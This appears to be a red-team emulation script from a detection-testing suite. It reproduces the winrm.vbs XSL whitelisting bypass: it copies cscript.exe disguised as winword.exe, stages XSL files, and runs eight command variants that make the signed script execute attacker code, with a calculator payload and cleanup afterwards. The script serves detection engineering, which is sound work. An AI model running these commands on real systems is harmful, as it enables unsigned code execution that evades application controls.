# Name: winrm.vbs Backdoor with .xsl Files
# rta: squiblyfoo.py
# ATT&CK:
# Description: downloads a xsl file executing commands using the signed winrm.vbs script
# References: https://posts.specterops.io/application-whitelisting-bypass-and-arbitrary-unsigned-code-execution-technique-in-winrm-vbs-c8c24fb40404

import common
import os
import time

@common.dependencies(common.get_path("bin", "WsmPty.xsl"))
def main():
    common.log("winrm.vbs executing a  backdoor")

    xslpath = common.get_path('bin','WsmPty.xsl')
    xslpath2 = common.get_path('bin','WsmTxt.xsl')
    targetdir = "%SystemDrive%\BypassDir\cscript.exe"
    cscriptName = "winword.exe" #"winword.exe" # "cscript.exe"

    common.execute(["cmd.exe","/C","mkdir","%s" % targetdir ])
    common.execute(["cmd.exe","/C","copy", "%windir%\System32\cscript.exe","%s\%s" % (targetdir,cscriptName)])
    common.execute(["cmd.exe","/C","copy", xslpath, targetdir])
    common.execute(["cmd.exe","/C","copy", xslpath2, targetdir])

    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty' % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:"pretty"'  % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 /format:pretty' % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 /format:"pretty"' % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:text' % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:"text"'  % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 /format:text' % (targetdir,cscriptName))
    common.execute( 'cmd.exe /C %s\%s //nologo  %%windir%%\System32\winrm.vbs get wmicimv2/Win32_Process?Handle=4 /format:"text"' % (targetdir,cscriptName))

    time.sleep(10)

    common.log("Killing all calc to cleanup", "-")
    common.execute(["taskkill", "/f", "/im", "calculator.exe"])
    
    common.log("Removing old files all calc to cleanup", "-")
    common.execute(["cmd.exe","/C","rd", "/s", "/q", targetdir])

if __name__ == "__main__":
    exit(main())